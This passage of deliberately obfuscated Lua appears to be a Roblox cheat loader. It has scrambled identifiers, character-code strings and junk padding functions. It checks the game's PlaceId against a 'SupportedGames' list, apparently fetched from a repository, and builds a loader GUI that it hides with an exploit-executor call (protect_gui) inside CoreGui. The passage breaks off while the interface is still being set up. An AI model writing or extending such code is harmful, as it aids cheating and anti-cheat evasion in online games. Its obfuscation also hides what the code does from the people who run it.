,(function(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO,uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO)local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO={698,323,(function(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO,UwUUwuOwOowoowOOwOOwOuWuowOOwoUWUuwUOWoUWuOwOowouWUUwuUwUOwOuWu,OwOuWuUwUOwOOwOowOUwUuwUOwOOwOUwUowOUwUOwOUwUOwOUwuowOUwUuWuOWo)return 903 and uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO or uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO==nil or UwUUwuOwOowoowOOwOOwOuWuowOOwoUWUuwUOWoUWuOwOowouWUUwuUwUOwOuWu*uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+UwUUwuOwOowoowOOwOOwOuWuowOOwoUWUuwUOWoUWuOwOowouWUUwuUwUOwOuWu,OwOuWuUwUOwOOwOowOUwUuwUOwOOwOUwUowOUwUOwOUwUOwOUwuowOUwUuWuOWo end)()or((11467)and(74313))or 12082*((16505)^(35084)),377,415}return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO end)()+102,72 ,117 ,98 ,47 ,109 ,97 ,115 ,116 ,101 ,114 ,47 ,(function()local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO="86229889D7BFF0CC76578F16259C61293619E062CF02BDE5F67A05793B6918B5ADB1D125BF152F1EF55"return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+0 end)(),117 ,112 ,112 ,111 ,114 ,116 ,101 ,100 ,71 ,97 ,109 ,101 ,115 )..'',true ))function UwUOwOuWuOwOuWUOwOUWuuwUoWOuwUUwuOwOowOowoOwOUWuoWoUwUuwUOwOowO()for uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO,uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO in uwUOwOUwUuwuOwOOwOOwOOwOUwUOwOowOOwOOwoOwOoWoOwOOwoOwoOWOuwuOwO(owOUwUuWuuwUUwUOwoUwuUwUOwoOWOOwoUwuUwUOwouWuUwUUwuOwOOwoUWuOwO)do if uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO==UwUOwoOwOOWOOwOUWUOwouWuOwOuWuuWuowOOwOoWOowoUwUuwuOwOOwOUwuuwU.PlaceId then return true  end end return false  end local function OwOuWuUwUOwOOwOowOUwUuwUOwOOwOUwUowOUwUOwOUwUOwOUwuowOUwUuWuOWo()local OwOuWuUwUOwOOwOowOUwUuwUOwOOwOUwUowOUwUOwOUwUOwOUwuowOUwUuWuOWo=OWOowOuwUUwuUwUOwOowOUwUUwUUwUowOUwUuwUOwOowoOwouwUUwUOwoUwUUwU.new(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(83 ,99 ,114 ,101 ,101 ,110 ,71 ,117 ,105 ).."")local uwUowOOwOuwUoWOuWuuwuUwUUwuuwUUwUUwuUwUuwUuwUuWUUwuuwUOwOOwoowO=OWOowOuwUUwuUwUOwOowOUwUUwUUwUowOUwUuwUOwOowoOwouwUUwUOwoUwUUwU.new(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(70 ,114 ,97 ,109 ,(function()local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO="7B24521EFF88985D31434CBC3619EE784BA27FD9CC68941A47853932614CDBA6D616FD0AA169F5ED1A26CBCD19B8FFCC3396"return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+1 end)()).."")local OWoUwuoWOOwOUwUUwUOwOOwOUwuOwOUwUOwOuwUUwUUwUUwUUwUowOUwuOwOOWO=OWOowOuwUUwuUwUOwOowOUwUUwUUwUowOUwUuwUOwOowoOwouwUUwUOwoUwUUwU.new(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(85 ,73 ,67 ,111 ,114 ,110 ,101 ,114 ).."")local OwOoWoOWoOwOOwOUwUUWuuwUUwUuWuOwOOwOUwUowOUwUOwoOwoOwoOWoOwOOwO=OWOowOuwUUwuUwUOwOowOUwUUwUUwUowOUwUuwUOwOowoOwouwUUwUOwoUwUUwU.new(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(84 ,101 ,120 ,116 ,76 ,97 ,98 ,101 ,108 ).."")local uWUuWuUwuowOUwUowOUWUUwUUwUOwOOwOOwOUwUuwUUwuUWuowOowoUwUOwOUwU=OWOowOuwUUwuUwUOwOowOUwUUwUUwUowOUwUuwUOwOowoOwouwUUwUOwoUwUUwU.new(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(73 ,109 ,97 ,103 ,101 ,76 ,97 ,98 ,101 ,108 ).."")local OwOOwoUwUOWoUWUUWUowOuwUuWUOwOUwuoWoOwOuwUoWOOwOUwUUwUowOuwUOwO=OWOowOuwUUwuUwUOwOowOUwUUwUUwUowOUwUuwUOwOowoOwouwUUwUOwoUwUUwU.new(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(70 ,114 ,97 ,109 ,101 ).."")local UWuOWoOwOUwuUwuuwUOwOuWuuwUOwOuwUOWoowOuwuUWuUwuOwouwUoWOuwUUwU=OWOowOuwUUwuUwUOwOowOUwUUwUUwUowOUwUuwUOwOowoOwouwUUwUOwoUwUUwU.new(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(85 ,73 ,67 ,111 ,114 ,110 ,101 ,114 ).."")local uwuuWuOwOOwoowOUwUOwOuwUuwUOwOOwOUwUowOoWoUWuUwuOwOuWUUwUUwUuwU=OWOowOuwUUwuUwUOwOowOUwUUwUUwUowOUwUuwUOwOowoOwouwUUwUOwoUwUUwU.new(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(84 ,101 ,120 ,116 ,66 ,117 ,(function(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO,uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO)local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO={983,52,876,500,300}return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO end)()+111,116 ,111 ,110 ).."")local OwOUwUOwOUWuOwoOWoOwOUWUuwUUwUuwuOwOowOOwoUwUOwOOwoOwOOwOOwoOwO=OWOowOuwUUwuUwUOwOowOUwUUwUUwUowOUwUuwUOwOowoOwouwUUwUOwoUwUUwU.new(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(85 ,73 ,67 ,111 ,(function()local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO="29C4D7863ED3C6D4FB5894FF8CC1ED3B92B57EC76EF481A70A74E76CFA629B49A840508BA55F22D20D6B0274F24788B8C4E8"return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+14 end)(),110 ,101 ,114 ).."")local uwUOwOOwOuwUOwoUwUUwUUwUoWOOwoOwOOwoOwoOwOUwUOwouwUoWouwUuWuUwU=OWOowOuwUUwuUwUOwOowOUwUUwUUwUowOUwUuwUOwOowoOwouwUUwUOwoUwUUwU.new(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(84 ,101 ,120 ,116 ,76 ,97 ,(function(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO,uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO)local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO={129,620,975,841,120}return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO end)()+93,101 ,108 ).."")local OwOUWUoWOOwOoWOuWuuWUOwOUwUOwOUwuUwUUWUOwOuWuuwUOwouwUoWoUwUUwU=OWOowOuwUUwuUwUOwOowOUwUUwUUwUowOUwUuwUOwOowoOwouwUUwUOwoUwUUwU.new(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(70 ,114 ,97 ,109 ,101 ).."")local OwoOwOOwOUwuUwUOwOOwOUwUUwuoWoOwouwUuWUUwUUwuOwOUWUUwuowOoWoOwo=OWOowOuwUUwuUwUOwOowOUwUUwUUwUowOUwUuwUOwOowoOwouwUUwUOwoUwUUwU.new(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(85 ,73 ,67 ,111 ,114 ,110 ,101 ,114 ).."")local uwuuwuUwUUwUOwOUWuOwoOwouwUOwOOwOOwoOwOUwUOwoOwOUwuowOUwuOwoOwO=OWOowOuwUUwuUwUOwOowOUwUUwUUwUowOUwUuwUOwOowoOwouwUUwUOwoUwUUwU.new(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(84 ,101 ,120 ,116 ,76 ,97 ,98 ,101 ,108 ).."")local uwUuwUuwuoWoOwOOwoowoUwUOwOUWUOwOoWoOwOowOOwoOwOowOOwoowOuwUUwU=OWOowOuwUUwuUwUOwOowOUwUUwUUwUowOUwUuwUOwOowoOwouwUUwUOwoUwUUwU.new(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(73 ,109 ,97 ,103 ,101 ,76 ,(function()local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO="084B568D88CA02A1B0563C23B615E59CC1502D01AAB85C1B8000A440A2CA1D1469489A586269F3747FDE3D636F84744E2"return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+0 end)(),98 ,101 ,108 ).."")local UWUoWouwUOWOOwOUwUOwOOwOUwUuwUOwOOwoUwuuwUOwOUwUowoUwUUwuOWOowO=OWOowOuwUUwuUwUOwOowOUwUUwUUwUowOUwUuwUOwOowoOwouwUUwUOwoUwUUwU.new(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(70 ,114 ,97 ,109 ,101 ).."")local OWOUwUOwOOwoOwoOWOOwOOwOOwooWoUwuuwUOwouwUowOUwUOwoowOowOOwOuwU=OWOowOuwUUwuUwUOwOowOUwUUwUUwUowOUwUuwUOwOowoOwouwUUwUOwoUwUUwU.new(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(85 ,73 ,67 ,111 ,114 ,110 ,101 ,114 ).."")local UwuOwOOwoOwOuwUUwUOwOOwoUwUOwOuWUuwuowOOwOuwUOwOuwUoWOOwoUwUUWU=OWOowOuwUUwuUwUOwOowOUwUUwUUwUowOUwUuwUOwOowoOwouwUUwUOwoUwUUwU.new(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(84 ,101 ,120 ,116 ,76 ,97 ,98 ,101 ,108 ).."")local UwuOWOOwouwuOwOowOOwOuwuOWouWuuWUOwoowOowOUWuOwOOwOOwoowoUwuUwU=OWOowOuwUUwuUwUOwOowOUwUUwUUwUowOUwUuwUOwOowoOwouwUUwUOwoUwUUwU.new(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(70 ,114 ,97 ,109 ,101 ).."")local OwOOwOuWUOwoUwUuWUOwoUwuOwOowOOwOUwuuwUuwUUwuowoOwOuwUUWUowOUwU=OWOowOuwUUwuUwUOwOowOUwUUwUUwUowOUwUuwUOwOowoOwouwUUwUOwoUwUUwU.new(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(85 ,73 ,67 ,111 ,114 ,110 ,101 ,114 ).."")local OwOUwUOwOUwUUwUowOUwUOwOowOUWuowOowOOwouwuOwOuwUOWOoWoOwoOwOUwu=OWOowOuwUUwuUwUOwOowOUwUUwUUwUowOUwUuwUOwOowoOwouwUUwUOwoUwUUwU.new(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(84 ,101 ,120 ,116 ,76 ,97 ,98 ,101 ,108 ).."")local uwUowOowOOwOUwUuwUOwOuwUUwUOwOOwOOwOowOOWOOwOUWUUwUUWuOwOOwOuwU=OWOowOuwUUwuUwUOwOowOUwUUwUUwUowOUwUuwUOwOowoOwouwUUwUOwoUwUUwU.new(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(73 ,109 ,97 ,103 ,101 ,76 ,97 ,98 ,(function(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO,uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO)local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO={317,201,663,448,773}return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO end)()+96,108 ).."")local OwOUwUoWoOwoowOOwOowOOwoOwouwUOWoOwouwUOwOuWUUwUOwOUwuuwUUwUOwO=OWOowOuwUUwuUwUOwOowOUwUUwUUwUowOUwUuwUOwOowoOwouwUUwUOwoUwUUwU.new(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(70 ,114 ,97 ,109 ,(function(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO,uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO)local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO={63,965,586,945,743}return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO end)()+96).."")local UwUowOUwUuwUuwUOWoUwUuwUOwoowouwuOwOUwUOwOOwouwUOwoOWOUwuowOOwO=OWOowOuwUUwuUwUOwOowOUwUUwUUwUowOUwUuwUOwOowoOwouwUUwUOwoUwUUwU.new(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(85 ,73 ,67 ,111 ,114 ,110 ,101 ,114 ).."")local OWOowOuwUUwuUwUOwOowOUwUUwUUwUowOUwUuwUOwOowoOwouwUUwUOwoUwUUwU=OWOowOuwUUwuUwUOwOowOUwUUwUUwUowOUwUuwUOwOowoOwouwUUwUOwoUwUUwU.new(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(84 ,101 ,120 ,116 ,76 ,97 ,(function(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO,uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO)local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO={319,364,534,(function(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO,UwUUwuOwOowoowOOwOOwOuWuowOOwoUWUuwUOWoUWuOwOowouWUUwuUwUOwOuWu,OwOuWuUwUOwOOwOowOUwUuwUOwOOwOUwUowOUwUOwOUwUOwOUwuowOUwUuWuOWo)return 451 and uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO or uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO==nil or UwUUwuOwOowoowOOwOOwOuWuowOOwoUWUuwUOWoUWuOwOowouWUUwuUwUOwOuWu*uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+UwUUwuOwOowoowOOwOOwOuWuowOOwoUWUuwUOWoUWuOwOowouWUUwuUwUOwOuWu,OwOuWuUwUOwOOwOowOUwUuwUOwOOwOUwUowOUwUOwOUwUOwOUwuowOUwUuWuOWo end)()or((94463)and(47790))or 21065*((44339)..(20671)),229}return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO end)()+93,101 ,108 ).."")local OwoowOuWUUwUUwUUwuuWUUWuUwUUwUUwuuwUOWOUWuUwUuWuOwOUwuOwOUwuUwu={OWOowOuwUUwuUwUOwOowOUwUUwUUwUowOUwUuwUOwOowoOwouwUUwUOwoUwUUwU,uwUOwOOwOuwUOwoUwUUwUUwUoWOOwoOwOOwoOwoOwOUwUOwouwUoWouwUuWuUwU,OwOUwUOwOUwUUwUowOUwUOwOowOUWuowOowOOwouwuOwOuwUOWOoWoOwoOwOUwu,UwuOwOOwoOwOuwUUwUOwOOwoUwUOwOuWUuwuowOOwOuwUOwOuwUoWOOwoUwUUWU,uwuuwuUwUUwUOwOUWuOwoOwouwUOwOOwOOwoOwOUwUOwoOwOUwuowOUwuOwoOwO,uwUOwOOwOuwUOwoUwUUwUUwUoWOOwoOwOOwoOwoOwOUwUOwouwUoWouwUuWuUwU,uwuuWuOwOOwoowOUwUOwOuwUuwUOwOOwOUwUowOoWoUWuUwuOwOuWUUwUUwUuwU,OwOoWoOWoOwOOwOUwUUWuuwUUwUuWuOwOOwOUwUowOUwUOwoOwoOwoOWoOwOOwO}local OwOuwUowOUwUoWOUwUOwOUwUUwUUwuOwOOwOOwOOWoUWUowOOwOuWuuwuuwUuwU={OwOUwUoWoOwoowOOwOowOOwoOwouwUOWoOwouwUOwOuWUUwUOwOUwuuwUUwUOwO,UwuOWOOwouwuOwOowOOwOuwuOWouWuuWUOwoowOowOUWuOwOOwOOwoowoUwuUwU,uwuuWuOwOOwoowOUwUOwOuwUuwUOwOOwOUwUowOoWoUWuUwuOwOuWUUwUUwUuwU,OwOUWUoWOOwOoWOuWuuWUOwOUwUOwOUwuUwUUWUOwOuWuuwUOwouwUoWoUwUUwU,UWUoWouwUOWOOwOUwUOwOOwOUwUuwUOwOOwoUwuuwUOwOUwUowoUwUUwuOWOowO,OwOOwoUwUOWoUWUUWUowOuwUuWUOwOUwuoWoOwOuwUoWOOwOUwUUwUowOuwUOwO,uwUowOOwOuwUoWOuWuuwuUwUUwuuwUUwUUwuUwUuwUuwUuWUUwuuwUOwOOwoowO,UwuOWOOwouwuOwOowOOwOuwuOWouWuuWUOwoowOowOUWuOwOOwOOwoowoUwuUwU}local UwUOwOUwuUWuowOUWUOwOOwoowOUwUuwUuwUuwUUwUuwUOwOOwoOwOuwUUwuowO={uwUowOowOOwOUwUuwUOwOuwUUwUOwOOwOOwOowOOWOOwOUWUUwUUWuOwOOwOuwU,uwUuwUuwuoWoOwOOwoowoUwUOwOUWUOwOoWoOwOowOOwoOwOowOOwoowOuwUUwU,uWUuWuUwuowOUwUowOUWUUwUUwUOwOOwOOwOUwUuwUUwuUWuowOowoUwUOwOUwU}OwOuWuUwUOwOOwOowOUwUuwUOwOOwOUwUowOUwUOwOUwUOwOUwuowOUwUuWuOWo.Name=uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(68 ,97 ,114 ,107 ,(function()local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO="36EE6F3D162E25581D22A5B2DCAD81B551E5AAC82204AF823DFF84F430213F35CB9A515D"return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+0 end)(),117 ,98 ,76 ,(function(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO,uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO)local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO={720,209,16,339,979}return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO end)()+106,97 ,100 ,101 ,114 )..""if UwUUwuOwOowoowOOwOOwOuWuowOOwoUWUuwUOWoUWuOwOowouWUUwuUwUOwOuWu and UwUUwuOwOowoowOOwOOwOuWuowOOwoUWUuwUOWoUWuOwOowouWUUwuUwUOwOuWu.protect_gui then UwUUwuOwOowoowOOwOOwOuWuowOOwoUWUuwUOWoUWuOwOowouWUUwuUwUOwOuWu.protect_gui(OwOuWuUwUOwOOwOowOUwUuwUOwOOwOUwUowOUwUOwOUwUOwOUwuowOUwUuWuOWo)OwOuWuUwUOwOOwOowOUwUuwUOwOOwOUwUowOUwUOwOUwUOwOUwuowOUwUuWuOWo.Parent=UwUOwoOwOOWOOwOUWUOwouWuOwOuWuuWuowOOwOoWOowoUwUuwuOwOOwOUwuuwU.CoreGui elseif OwOUwuowOUwuUWuowOOwoOwOuwuuwuOwOOwouWUUwuUWUUwuOwOOwouwUOWoOwO then OwOuWuUwUOwOOwOowOUwUuwUOwOOwOUwUowOUwUOwOUwUOwOUwuowOUwUuWuOWo.Parent=OwOUwuowOUwuUWuowOOwoOwOuwuuwuOwOOwouWUUwuUWUUwuOwOOwouwUOWoOwO()else OwOuWuUwUOwOOwOowOUwUuwUOwOOwOUwUowOUwUOwOUwUOwOUwuowOUwUuWuOWo.Parent=UwUOwoOwOOWOOwOUWUOwouWuOwOuWuuWuowOOwOoWOowoUwUuwuOwOOwOUwuuwU.CoreGui end OwOuWuUwUOwOOwOowOUwUuwUOwOOwOUwUowOUwUOwOUwUOwOUwuowOUwUuWuOWo.ZIndexBehavior=OwoowOowOuWuUwuOwOuwUuwUOwouWuuwUOwooWoUWuOwOUwUuwUOwOOwOUwUOwO.ZIndexBehavior.Sibling uwUowOOwOuwUoWOuWuuwuUwUUwuuwUUwUUwuUwUuwUuwUuWUUwuuwUOwOOwoowO.Name=uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(77 ,97 ,105 ,110 ,70 ,114 ,97 ,(function(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO,uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO)local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO={133,209,329,21,457}return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO end)()+104,101 )..""uwUowOOwOuwUoWOuWuuwuUwUUwuuwUUwUUwuUwUuwUuwUuWUUwuuwUOwOOwoowO.Parent=OwOuWuUwUOwOOwOowOUwUuwUOwOOwOUwUowOUwUOwOUwUOwOUwuowOUwUuWuOWo uwUowOOwOuwUoWOuWuuwuUwUUwuuwUUwUUwuUwUuwUuwUuWUUwuuwUOwOOwoowO.AnchorPoint=owOUwUuWuOwOOwOOwOUwUowOUwUUwUUwUuWuuwUOwOOwOowOuwUuwuOwOUwUUWu.new(0.5 ,0.5 )uwUowOOwOuwUoWOuWuuwuUwUUwuuwUUwUUwuUwUuwUuwUuWUUwuuwUOwOOwoowO.BackgroundColor3=UwuUwuUwUowOuwUUwuOWoUwuUWUoWoOwOowOowOowOuWuowOOWoOwoUwuUwUUwU.fromRGB(79 ,79 ,79 )uwUowOOwOuwUoWOuWuuwuUwUUwuuwUUwUUwuUwUuwUuwUuWUUwuuwUOwOOwoowO.BackgroundTransparency=1.000  uwUowOOwOuwUoWOuWuuwuUwUUwuuwUUwUUwuUwUuwUuwUuWUUwuuwUOwOOwoowO.Position=OwOOwOOwoUWuOwOuwUOwOUwuowoOwOUwUOwOowOUWuuwUUwUowOuwUUwUowOUWU.new(0.5 ,0 ,0.5 ,(function(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO,uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO)local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO={}return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO end)()+0)OWoUwuoWOOwOUwUUwUOwOOwOUwuOwOUwUOwOuwUUwUUwUUwUUwUowOUwuOwOOWO.CornerRadius=oWoowOoWOUWUUWUUwUUwUoWoOwOOwOOwoOwOOwOOwOUwUuwUowOOwOUWuOWoowO.new(0 ,11 )OWoUwuoWOOwOUwUUwUOwOOwOUwuOwOUwUOwOuwUUwUUwUUwUUwUowOUwuOwOOWO.Name=uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(77 ,97 ,105 ,110 ,70 ,114 ,97 ,109 ,101 ,85 ,73 ,67 ,111 ,114 ,110 ,101 ,114 )..""OWoUwuoWOOwOUwUUwUOwOOwOUwuOwOUwUOwOuwUUwUUwUUwUUwUowOUwuOwOOWO.Parent=uwUowOOwOuwUoWOuWuuwuUwUUwuuwUUwUUwuUwUuwUuwUuWUUwuuwUOwOOwoowO OwOoWoOWoOwOOwOUwUUWuuwUUwUuWuOwOOwOUwUowOUwUOwoOwoOwoOWoOwOOwO.Name=uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(84 ,105 ,116 ,(function(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO,uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO)local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO={142,17,499,341,637}return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO end)()+103,101 ,77 ,97 ,105 ,110 )..""OwOoWoOWoOwOOwOUwUUWuuwUUwUuWuOwOOwOUwUowOUwUOwoOwoOwoOWoOwOOwO.Parent=uwUowOOwOuwUoWOuWuuwuUwUUwuuwUUwUUwuUwUuwUuwUuWUUwuuwUOwOOwoowO OwOoWoOWoOwOOwOUwUUWuuwUUwUuWuOwOOwOUwUowOUwUOwoOwoOwoOWoOwOOwO.AnchorPoint=owOUwUuWuOwOOwOOwOUwUowOUwUUwUUwUuWuuwUOwOOwOowOuwUuwuOwOUwUUWu.new(0.5 ,0.5 )OwOoWoOWoOwOOwOUwUUWuuwUUwUuWuOwOOwOUwUowOUwUOwoOwoOwoOWoOwOOwO.BackgroundColor3=UwuUwuUwUowOuwUUwuOWoUwuUWUoWoOwOowOowOowOuWuowOOWoOwoUwuUwUUwU.fromRGB(255 ,255 ,255 )OwOoWoOWoOwOOwOUwUUWuuwUUwUuWuOwOOwOUwUowOUwUOwoOwoOwoOWoOwOOwO.BackgroundTransparency=1.000  